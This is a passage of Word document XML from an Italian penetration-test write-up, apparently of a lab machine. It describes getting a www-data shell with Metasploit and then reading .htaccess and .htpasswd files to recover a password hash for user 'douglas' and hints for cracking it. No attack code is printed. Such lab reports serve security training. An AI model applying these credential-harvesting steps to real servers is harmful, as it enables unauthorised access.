        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="015777C1" w14:textId="441C41B3" w:rsidR="00DC37EC" w:rsidRPr="00DC37EC" w:rsidRDefault="00DC37EC" w:rsidP="00DC37EC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Quindi, abbiamo </w:t>
      </w:r>
      <w:r w:rsidR="00412BD5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">sfruttato con successo la macchina target e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ottenuto una shell</w:t>
      </w:r>
      <w:r w:rsidR="00412BD5">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> come ww</w:t>
      </w:r>
      <w:r w:rsidR="00F2226A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">w-data, inoltre </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">siamo andati a visionare i metadati all’interno di </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC37EC">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC37EC">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>opt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC37EC">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>/ona/www</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE020DC" w14:textId="37A33217" w:rsidR="00F2226A" w:rsidRPr="00F2226A" w:rsidRDefault="002A18BB" w:rsidP="00F2226A">
      <w:pPr>
        <w:ind w:left="360"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251687936" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0AC56304" wp14:editId="66D2EFFA">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>620506</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1391508</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="619315" cy="121697"/>
                <wp:effectExtent l="0" t="0" r="28575" b="12065"/>
                <wp:wrapNone/>
                <wp:docPr id="678193399" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="619315" cy="121697"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="2449FB59" w14:textId="77777777" w:rsidR="002A18BB" w:rsidRDefault="002A18BB" w:rsidP="002A18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56304" id="_x0000_s1042" style="position:absolute;left:0;text-align:left;margin-left:48.85pt;margin-top:109.55pt;width:48.75pt;height:9.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1IUgIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X21nadoGcYqsRYYB&#10;RRugHXpWZCk2IIsapcTufv0o2W2ybqdhF5kUKX48Pnpx3beGHRT6BmzJi7OcM2UlVI3dlfz70/rT&#10;JWc+CFsJA1aV/EV5fr38+GHRubmaQA2mUsgoiPXzzpW8DsHNs8zLWrXCn4FTlowasBWBVNxlFYqO&#10;orcmm+T5LOsAK4cglfd0ezsY+TLF11rJ8KC1V4GZklNtIZ2Yzm08s+VCzHcoXN3IsQzxD1W0orGU&#10;9C3UrQiC7bH5I1TbSAQPOpxJaDPQupEq9UDdFPm7bh5r4VTqhcDx7g0m///CyvvDo9sgwdA5P/ck&#10;xi56jW38Un2sT2C9vIGl+sAkXc6Kq8/FOWeSTMWkmF1dRDCz42OHPnxV0LIolBxpFgkicbjzYXB9&#10;dYm5LKwbY9I8jGVdySfn05xGJgXRQhsRSGxdVXJvd5wJsyO+yYAppAfTVPF5DORxt70xyA4izjz/&#10;kq/TmKmy39xi7lvh68EvmcYGjI1hVGLPWOoRnCiFftuzhkopZvFJvNpC9bJBhjAwzDu5bijBnfBh&#10;I5AoRZ3QmoQHOrQBag9GibMa8Off7qM/TZqsnHVEUWr9x16g4sx8s8SBq2I6jZxOyvT8YkIKnlq2&#10;pxa7b2+AECloIZ1MYvQP5lXUCO0zbdMqZiWTsJJyDyCPyk0YVof2UarVKrkRj50Id/bRyRg8Qheh&#10;feqfBbpx9oFIcw+vdBbzdxQYfAcSrPYBdJP4ccSVeBUV2oHEsHFf45Kd6snr+FdZ/gIAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAImyaNzfAAAACgEAAA8AAABkcnMvZG93bnJldi54bWxMj8tOwzAQRfdI/IM1&#10;SOyo8xA0CXEqhITEokj08QHTeJpExOPIdtv073FXsJyZozvn1qvZjOJMzg+WFaSLBARxa/XAnYL9&#10;7uOpAOEDssbRMim4kodVc39XY6XthTd03oZOxBD2FSroQ5gqKX3bk0G/sBNxvB2tMxji6DqpHV5i&#10;uBllliQv0uDA8UOPE7331P5sT0aBWbelC59dvv/Oi+t62AV5NF9KPT7Mb68gAs3hD4abflSHJjod&#10;7Im1F6OCcrmMpIIsLVMQN6B8zkAc4iYvcpBNLf9XaH4BAAD//wMAUEsBAi0AFAAGAAgAAAAhALaD&#10;OJL+AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYA&#10;CAAAACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYA&#10;CAAAACEAsFltSFICAACdBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAU&#10;AAYACAAAACEAibJo3N8AAAAKAQAADwAAAAAAAAAAAAAAAACsBAAAZHJzL2Rvd25yZXYueG1sUEsF&#10;BgAAAAAEAAQA8wAAALgFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="2449FB59" w14:textId="77777777" w:rsidR="002A18BB" w:rsidRDefault="002A18BB" w:rsidP="002A18BB">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00DC37EC" w:rsidRPr="00DC37EC">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2829959D" wp14:editId="55DFE6ED">
            <wp:extent cx="5274310" cy="3200400"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="925271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1868" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId47"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="3200400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F2226A" w:rsidRPr="00F2226A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Figura</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F2226A" w:rsidRPr="00F2226A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> 19: shell </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F2226A" w:rsidRPr="00F2226A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>tramite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F2226A" w:rsidRPr="00F2226A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="auto"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30412FEA" w14:textId="77777777" w:rsidR="00F2226A" w:rsidRDefault="00F2226A" w:rsidP="00DC37EC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="510F63C4" w14:textId="6A46CE33" w:rsidR="00033D6F" w:rsidRDefault="008D2168" w:rsidP="00033D6F">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc139378620"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidR="00F2226A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">.1 </w:t>
      </w:r>
      <w:r w:rsidR="00033D6F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="00033D6F" w:rsidRPr="00F2226A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">dentifying </w:t>
      </w:r>
      <w:r w:rsidR="00033D6F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00033D6F" w:rsidRPr="00F2226A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">dditional </w:t>
      </w:r>
      <w:r w:rsidR="00033D6F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r w:rsidR="00033D6F" w:rsidRPr="00F2226A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:caps w:val="0"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="14756476" w14:textId="77777777" w:rsidR="00033D6F" w:rsidRDefault="00033D6F" w:rsidP="00033D6F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="735AA5CA" w14:textId="54B411AC" w:rsidR="00703494" w:rsidRPr="00703494" w:rsidRDefault="00703494" w:rsidP="00033D6F">
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Andando ad esplorare le vari</w:t>
      </w:r>
      <w:r w:rsidR="00330BAA">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>directoty</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> che abbiamo a disposizione entriamo all’interno di </w:t>
      </w:r>
      <w:r w:rsidRPr="00703494">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>/var/www/html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> dove al suo interno abbiamo i file che ci sono stati descritti nella fase di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Vulnetability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Mapping</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Entriamo all’interno di </w:t>
      </w:r>
      <w:r w:rsidRPr="00703494">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>reports</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e notiamo un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidRPr="00033D6F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.htaccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214BAB69" w14:textId="1B8755D5" w:rsidR="00033D6F" w:rsidRDefault="00033D6F" w:rsidP="00033D6F">
      <w:r w:rsidRPr="00BA0682">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BA0682">
        <w:t>Hypertext</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BA0682">
        <w:t xml:space="preserve"> Access file) è un file di configurazione letto dal server utilizzato</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> per</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA0682">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA0682">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>sovrascrivere impostazioni</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA0682">
        <w:t xml:space="preserve"> ed è impiegato per l’autorizzazione, il controllo della cache, l’ottimizzazione del sito e la riscrittura degli URL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2A429D" w14:textId="77777777" w:rsidR="00703494" w:rsidRDefault="00703494" w:rsidP="00033D6F"/>
    <w:p w14:paraId="4AFB16C6" w14:textId="5714D889" w:rsidR="00703494" w:rsidRDefault="00303C58" w:rsidP="00703494">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00703494">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>cat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> andiamo a stampare il contenuto di tale </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00703494">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>directoty</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00703494">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> e al suo interno troviamo alcune informazioni sull’autorizzazione e viene esplicitata anche una directory </w:t>
      </w:r>
      <w:r w:rsidR="002A18BB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">relativa a un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002A18BB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidR="002A18BB" w:rsidRPr="002A18BB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.htpasswd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002A18BB">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C1918C" w14:textId="23699BCE" w:rsidR="002A18BB" w:rsidRDefault="002A18BB" w:rsidP="002A18BB">
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:rStyle w:val="Enfasigrassetto"/>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i/>
          <w:iCs/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>htpasswd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve"> è un </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>flat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>-file</w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve"> utilizzato per memorizzare i nomi utente e le password per l'autenticazione di base di </w:t>
      </w:r>
      <w:hyperlink r:id="rId48" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="002A18BB">
          <w:rPr>
            <w:rStyle w:val="Enfasigrassetto"/>
            <w:rFonts w:cs="Times New Roman"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Apache HTTP Server</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve">. Il nome del file è dato nella configurazione </w:t>
      </w:r>
      <w:hyperlink r:id="rId49" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="002A18BB">
          <w:rPr>
            <w:rStyle w:val="Enfasigrassetto"/>
            <w:rFonts w:cs="Times New Roman"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:i/>
            <w:iCs/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="002A18BB">
          <w:rPr>
            <w:rStyle w:val="Enfasigrassetto"/>
            <w:rFonts w:cs="Times New Roman"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:i/>
            <w:iCs/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>htaccess</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">il nome canonico che viene assegnato è </w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>htpasswd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve">" </w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve">Il nome del file inizia con un punto, perché la maggior parte dei sistemi operativi </w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Unix-like</w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve"> considerano qualsiasi file che inizia con punto </w:t>
      </w:r>
      <w:r>
        <w:t>come</w:t>
      </w:r>
      <w:r w:rsidRPr="002A18BB">
        <w:t xml:space="preserve"> nascosto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10913AA6" w14:textId="77777777" w:rsidR="00250578" w:rsidRDefault="002A18BB" w:rsidP="002A18BB">
      <w:r>
        <w:t xml:space="preserve">A questo punto sempre tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> vediamo il suo contenuto.</w:t>
      </w:r>
      <w:r w:rsidR="00250578">
        <w:t xml:space="preserve"> Ci viene stampata un hash, associato all’utente </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00250578">
        <w:t>douglas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00250578">
        <w:t xml:space="preserve"> e in più ci vengono dati dei suggerimenti sulla password da cercare.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD33404" w14:textId="4B0EC465" w:rsidR="002A18BB" w:rsidRDefault="00250578" w:rsidP="002A18BB">
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50987655" w14:textId="68AE025C" w:rsidR="002A18BB" w:rsidRPr="00250578" w:rsidRDefault="00250578" w:rsidP="00250578">
      <w:pPr>
        <w:pStyle w:val="PreformattatoHTML"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251696128" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="77563852" wp14:editId="6C3326D1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>0</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3190365</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3951026" cy="142875"/>
                <wp:effectExtent l="0" t="0" r="11430" b="28575"/>
                <wp:wrapNone/>
                <wp:docPr id="2001921870" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="3951026" cy="142875"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
